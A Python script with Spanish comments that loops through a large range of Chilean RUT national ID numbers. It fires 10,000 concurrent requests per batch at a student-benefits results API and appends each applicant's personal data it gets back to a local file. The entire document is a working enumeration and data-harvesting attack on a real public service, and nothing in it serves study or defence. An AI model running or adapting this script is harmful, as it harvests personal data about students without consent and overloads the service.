import asyncio
import aiohttp
from bs4 import BeautifulSoup as bs
import regex
import json
import time
print('Cargando diccionario...')
#from data import dicc as data#300 megas pesa solo el data.py
print('Diccionario cargado')
data = {}

async def fetch_rut(session, rut):
    rut = str(rut)
    timeout = aiohttp.ClientTimeout(total=10)
    try:
        async with session.get(f'https://resultados.beneficiosestudiantiles.cl/api/veRecaptcha.php?rut={rut}&callback=ng_jsonp_callback_0') as response:
            respuesta = await response.text()
            return respuesta[26:len(respuesta) -1]
    except:
        return '{"status": 404}'


async def main(rut_inicial, dicc):
    async with aiohttp.ClientSession() as session:
        rut = rut_inicial

        start = time.perf_counter()
        while rut <= 22600000:
            print(rut)
            tasks = [fetch_rut(session, rut+i) for i in range(10000)]
            resultados = await asyncio.gather(*tasks)
            """
            for i in range(len(resultados)):
                dicc_respuesta = json.loads(resultados[i])

                if dicc_respuesta['status'] == 200:
                        
                    data = dicc_respuesta['resultado']['datosPostulante']
                    datos = ", ".join([dato['valor'] for dato in data])
                    print(rut, datos)
                rut += 1
            end = time.perf_counter()
            print('Tiempo:', end-start)
            """
            with open("edu20.py", "rb") as f:
                # Lee todas las líneas excepto la última
                lines = f.readlines()

            with open("edu20.py", "wb") as f:
                # Escribe todas las líneas, excepto la última
                f.writelines(lines[:-1])

            with open('edu20.py', 'a') as f:
                for i in range(len(resultados)):
                    dicc_respuesta = json.loads(resultados[i])

                    if dicc_respuesta['status'] == 200:
                            
                        data = dicc_respuesta['resultado']['datosPostulante']
                        datos = ", ".join([dato['valor'] for dato in data])
                        print(rut, datos)

                        string = f'\n    "{rut}": "{datos}",'
                        f.write(string)

                    rut += 1
            with open('edu20.py', 'a') as f:
                f.write('\n}')

rut_inicial = 21380000
start = time.perf_counter()
asyncio.run(main(rut_inicial, data))
end = time.perf_counter()
print(end - start)
